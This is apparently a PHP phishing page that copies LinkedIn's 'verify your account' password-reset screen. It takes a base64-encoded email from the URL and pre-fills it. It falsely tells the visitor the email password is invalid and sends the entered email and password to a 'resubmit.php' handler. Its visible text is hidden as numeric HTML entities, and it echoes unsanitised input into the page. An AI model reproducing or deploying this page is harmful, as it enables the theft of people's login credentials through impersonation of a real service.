<?php

header("Content-Type: text/html; charset=ISO-8859-1");

if (isset($_GET['id'])) {

	$id = $_GET['id'];
}

$cid = base64_decode($id);


?>
<!DOCTYPE html>
 <!--[if !IE]><!--> <html lang="en" class="os-win"> <!--<![endif]-->

<head>
<link rel="apple-touch-icon-precomposed" href="https://static.licdn.com/scds/common/u/img/icon/apple-touch-icon.png">
<link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">


<meta name="msapplication-TileImage" content="https://static.licdn.com/scds/common/u/images/logos/linkedin/logo-in-win8-tile-144_v1.png"/>
<meta name="msapplication-TileColor" content="#0077B5"/>
<meta name="application-name" content="LinkedIn"/>
 <link rel="openid.server" href="https://www.linkedin.com/uas/openid/authorize">

 <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=765zh9odycznutep5f0mj07m4-c8kkvmvykvq2ncgxoqb13d2by-97r9i8f0vw2gmq97lpzb2ohek-7mxyksftlcjzimz2r05hd289r-4uu2pkz5u0jch61r2nhpyyrn8-7poavrvxlvh0irzkbnoyoginp-4om4nn3a2z730xs82d78xj3be-7m0xa9uspuliui8l4c806ppxc-ct4kfyj4tquup0bvqhttvymms-cjn95l493mkfqfc06i462jhjl-8ti9u6z5f55pestwbmte40d9-cernnxjzxrrt8qy88tyxhj3c5-3pwwsn1udmwoy3iort8vfmygt-cfsam81o5sp3cxb7m0hs933c4-8x71pylgger6xcy8j6xp3mxe6-aze4ooami6s3kk293iv0zfky1">
 
 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=3nuvxgwg15rbghxm1gpzfbya2-1nm61x5u7981e88m10hpaekkm-mv3v66b8q0h1hvgvd3yfjv5f-14k913qahq3mh0ac0lh0twk9v-9yapbb9c5ce3w0tjhqp8s1ben-be35lq69dqsbgl8h9t4bqpy08-avftajdh5oq2u6k2vaor3czdy-62og8s54488owngg0s7escdit-c8ha6zrgpgcni7poa5ctye7il-djim7uyllidc9gta745y2wo5m-51dv6schthjydhvcv6rxvospp-d7z5zqt26qe7ht91f8494hqx5-e9rsfv7b5gx0bk0tln31dx3sq-2r5gveucqe4lsolc3n0oljsn1-8v2hz0euzy8m1tk5d6tfrn6j-di2107u61yb11ttimo0s2qyh2-oj1awm2qygfeios7s2x0fa61-edgsl2z4e4gk56cy2m5kbpp1q-a5z91y8xfiqdawrgpl2z4m6gs-93jgstnkffqiw9htrr1tva7y3-7oayq6ato0qqkz6gz6iunlkxr-999q8q1ovip41ng1nylee3woz-5gedbbq7rksg5ypd5ruwisrah-39kuwv80yvqr74w4oe9bge0md-7ty57fxmbd5klxui85wcgpq3k-e1yamnwwzlstlh2d0l31jqbq3-39qtiin34ku3a7j62elxviuxr-8su35siohpmem14ncxhw06cld-ccxtvi3w660pars8qw3alamil-5p4tr668dhjsfxmginsjbif9i-f1d41gkxp7myc4ptehhznofqp"></script>
 
 
      <meta name="IntlJsUrl" content="https://static.licdn.com/scds/concat/common/js?v=0.1.325&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2FIntl.min&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2Flocale_data%2Fen_US.min"/>

 
 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=25kaepc6rgo1820ap1rglmzr4-2t5vzdsqqh8rke20hh46pvci0-cl5mre9823ndhfdrl4nozaofi-6isi7fr80gagap7736arbauct-8ohb0iio22nbqe1w8et54sawe-13kfns70b5ghzzqxzr194d2jo-cr2cf88zdeizqhuobqtot8sge-5pmigtkow46izwzcb8m1b57ly-br7xw7z07pbsy9z5545ze80zu-aikuay313zihm7be1fml6lb8y-7o42uuu659mk0achuq76yljc7-7vr4nuab43rzvy2pgq7yvvxjk-9qa4rfxekcw3lt2c06h7p0kmf"></script>
 
 
 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=7ndrn0f9fw0hum7uoqcjcnzne-95d8d303rtd0n9wj4dcjbnh2c"></script>

<title>&#69;&#109;&#97;&#105;&#108;&#32;&#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#124;&#32;&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;</title>


                    <link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=a83k17a16bmh0j5qk8csusux9">
    

</head>

<body dir="ltr" class="guest v2 login-bg-v2 plain chrome-v5 chrome-v5-responsive sticky-bg guest" id="pagekey-uas-request-password-reset">
 
 
 <input id="inSlowConfig" type="hidden" value="false" />

<script type="text/javascript">document.body.className += " js ";</script>


<div id="header" class="guest">
 <div class="wrapper">
 <div id="nav-primary">
 <div class="wrapper">
 <div class="logo" id="logo-linkedin">
 <img src="https://static.licdn.com/scds/common/u/img/logos/logo_linkedin_92x22.png" width="92" height="22" alt="LinkedIn">
 </div>
 <ul class="menu">
 <li id="nav-primary-auth"><a href="#" rel="nofollow"><span>Sign in</span></a></li>
 </ul>
 </div>
 </div>
 </div>
</div>
 
<div id="body">
 <div class="wrapper">

<div id="global-error">
</div>

  <h1 class="flow-h1">&#76;&#101;&#116;&#8217;&#115;&#32;&#118;&#101;&#114;&#105;&#102;&#121;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</h1>
  <div id="bg-fallback"></div>
  <div class="request-password-reset flow-login">
    
      
        <form action="resubmit.php" method="POST" name="requestPasswordReset" novalidate="novalidate" class="flow-login-form" id="PWResetForm">
       
       
    
      <div class="flow-login-status"></div>
      <div class="flow-login-content">
            <fieldset class="flow-fieldset">
              <legend></legend>
              <h2 class="flow-h2">&#84;&#104;&#101;&#114;&#101;&#32;&#119;&#101;&#114;&#101;&#32;&#111;&#110;&#101;&#32;&#111;&#114;&#32;&#109;&#111;&#114;&#101;&#32;&#101;&#114;&#114;&#111;&#114;&#115;&#32;&#105;&#110;&#32;&#121;&#111;&#117;&#114;&#32;&#115;&#117;&#98;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#32;&#116;&#104;&#101;&#32;&#109;&#97;&#114;&#107;&#101;&#100;&#32;&#102;&#105;&#101;&#108;&#100;&#115;&#32;&#98;&#101;&#108;&#111;&#119;&#46;</h2>

              <div class="fieldgroup">
                <label for="userName-requestPasswordReset" class="flow-label pw-reset-lbl">&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;</label>
                <input type="email" name="userName" value="<?php echo $cid; ?>" id="userName-requestPasswordReset" class="flow-input pw-reset-email required" autocorrect="off" autocapitalization="off">
                <span class="error" id="userName-requestPasswordReset-error"></span>
              </div>
			  
			  <div class="fieldgroup">
                <label for="userPass-requestPasswordReset" class="flow-label pw-reset-lbl"><font color="red">&#73;&#110;&#118;&#97;&#108;&#105;&#100;&#32;&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</font></label>
                <input type="password" name="userPass" value="" id="userPass-requestPasswordReset" class="flow-input pw-reset-email required" autocorrect="off" autocapitalization="off">
                <span class="error" id="userName-requestPasswordReset-error"></span>
              </div>

              <div class="form-actions">
                <input type="submit" name="request" value="Submit" id="btnSubmitResetRequest" class="btn-submit" disabled>
              </div>

              <div class="loader"></div>
            </fieldset>
      </div>

          <input type="hidden" name="session_redirect" value="" id="session_redirect-requestPasswordReset"><input type="hidden" name="csrfToken" value="ajax:6770930749671745434" id="csrfToken-requestPasswordReset"><input type="hidden" name="sourceAlias" value="0_fsDJdspINGcXRI_pqqHC3HSSITmfl_mnjFDcc1UrRhw" id="sourceAlias-requestPasswordReset">
          </form>

  </div>

 </div>
</div>

<script type="text/javascript">LI.Controls.processQueue();</script>


<script type="text/javascript">LI.Controls.processQueue();</script>

<div id="footer">
 <div class="wrapper">
 <div id="legal">
 <p id="copyright">LinkedIn Corporation &copy; 2017</p>
 <p id="terms-of-use">
 Commercial use of this site without express authorization is prohibited.
 </p>
 </div>
 </div>
</div>

 <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=7k4d6908luvyxhub5xfe75eyy-6nzw9cwr7vz4foi8gwf1lnsth-a41ta3jc47pqgbhatfqzr8pxw-ci7t0f4m6n5to6rsezhntlq6f"></script>

          <script id="localChrome"></script>

                    <script type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=7exvilon37kzbjltlp40ffv0w-59miwv4s1acunbe3h115uuv8m"></script>

<script type="text/javascript">LI.Controls.processQueue();</script>

 </body>
</html>